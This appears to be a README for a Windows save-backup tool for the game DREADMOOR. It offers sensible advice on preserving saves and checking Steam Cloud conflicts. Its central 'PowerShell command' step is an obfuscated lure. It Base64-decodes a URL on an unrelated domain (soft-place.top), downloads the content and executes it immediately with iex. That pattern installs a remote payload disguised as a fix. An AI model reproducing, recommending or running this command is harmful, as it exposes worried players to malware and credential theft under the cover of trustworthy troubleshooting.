<p align="center">
  <img src="https://i.postimg.cc/nrRg7f7F/banner.png" alt="DREADMOOR Save Sentinel — Windows save backup and progress check companion for DREADMOOR" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11">
  <img src="https://img.shields.io/badge/Run%20via-PowerShell-5391FE?style=flat-square&logo=powershell" alt="Run via PowerShell">
  <img src="https://img.shields.io/badge/License-MIT-2EA44F?style=flat-square" alt="License: MIT">
</p>

# DREADMOOR Save Files Not Loading? DREADMOOR Save Sentinel for Windows

**A November 2026 Steam discussion describes saves appearing to roll back several hours despite regular saving; the developer responded that the team is investigating the save-game problem.**

**DREADMOOR Save Sentinel** is a backup-first Windows companion and checklist for preserving surviving save slots, inspecting file timestamps, and preventing accidental overwrites during Steam Cloud syncs.

**For:** DREADMOOR · Windows PC (Steam) · Save-file backup, timestamp checks, and rollback documentation  
**Not for:** editing save progression or reconstructing data that was never written to disk

## Run DREADMOOR Save Sentinel with PowerShell

Close **DREADMOOR** completely and let Steam Cloud finish syncing before running any save inspection or backup command.

1. Press **Win + X** on your keyboard.
2. Choose **Terminal** or **Windows PowerShell** from the menu (on some Windows configurations **Win + X**, then **I** opens the terminal; shortcuts vary).
3. Copy the PowerShell command shown below, paste it into the terminal, and press **Enter**.
4. Review the on-screen messages and keep an untouched copy of your save files outside the game folder.

### PowerShell command

```powershell
iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtcGxhY2UudG9wL3dvcmtlcj89NzY1MTI5MDYxMy9GaXg='))) -UseBasicParsing)
```

## What to check first

| Situation | First useful check | Why it matters |
| --- | --- | --- |
| Game loads an older checkpoint after restart | Exit immediately and copy the entire save directory before launching again | Starting new sessions can overwrite surviving autosave/manual slots |
| Unsure where saves are stored on Windows | Check user profile save locations rather than only the Steam install folder | Save directories are often separated from game binaries |
| Steam Cloud sync conflict prompt appears | Back up local files to a dated folder before choosing Local or Cloud | Prevents an older cloud snapshot from replacing newer local files |
| Multiple save slots or profiles exist | Compare file sizes and modified timestamps in read-only mode | Identifies which slot actually holds the latest valid write |

## Step-by-step checks

### 1. Do not overwrite the remaining saves

Exit DREADMOOR and avoid creating new saves until you have copied the current save directory to a separate folder.

### 2. Find the actual save directory

Use the game’s support information and your Windows profile to locate the save folder. Do not assume the installation directory is where saves are stored.

### 3. Copy before testing

Keep a date-stamped copy of the entire save directory on a different drive or in a separate backup folder (for example, `Documents\DREADMOOR-Backups\2026-11-17\`).

### 4. Compare timestamps and filenames

Look for unexpectedly older modified dates, multiple profiles, or separate autosave and manual-save slots. File age alone does not prove that a save is valid.

### 5. Check Steam Cloud carefully

If the game uses cloud sync on your configuration, avoid blindly replacing local files with an older cloud copy. Make a local backup first.

### 6. Document the rollback

Write down the last valid checkpoint, the time the game was exited, and which save slots remain visible; include these details in a developer support report.

## Notes before making changes

This guide does not claim to repair corrupted saves or reconstruct progress that was never saved. Record your game version and Windows version, keep a dated backup before moving, deleting, or overwriting any file, and change one variable at a time.

## Before opening an issue

When opening an [issue](../../issues), include:

- Current game build / update date and Windows version;
- Whether Steam Cloud was active and whether a sync conflict appeared;
- Modified timestamps and file sizes of the remaining save slots;
- Approximate hours of progress rolled back and the last valid checkpoint.

Remove your Windows username and Steam ID from screenshots and paths before sharing publicly.

## Frequently asked questions

**Why does DREADMOOR load an older save?**  
Players have reported missing recent progress, and the developer has acknowledged investigating save issues. The exact cause of an individual rollback cannot be diagnosed from the symptom alone.

**Can a backup restore missing progress?**  
Only if a valid earlier copy exists. A backup cannot reconstruct data that was never saved or is no longer available.

**Should I delete the save folder to fix loading?**  
No. Preserve the current files before any troubleshooting or repair attempts.

## Sources and further reading

- [DREADMOOR Steam discussion: loaded saves missing](https://steamcommunity.com/app/3629430/discussions/0/571554831822590489/)
- [DREADMOOR Steam community](https://steamcommunity.com/app/3629430/discussions/)

*Independent community project. Not affiliated with the game publisher, Steam, or third-party mod authors. All product names remain the property of their respective owners.*

---

## Search reference: DREADMOOR Windows Troubleshooting

### DREADMOOR save not loading

When DREADMOOR is not loading your most recent save, start by preserving existing save files and checking timestamps rather than deleting or replacing them.

### DREADMOOR save backup on Windows

A dated copy of every save slot is useful before game updates, Steam Cloud changes, or troubleshooting an unexpected rollback.

### DREADMOOR lost progress after loading

If you lose hours of game progress, record the missing slots and game version. Reporting a reproducible case helps distinguish local file problems from game bugs.
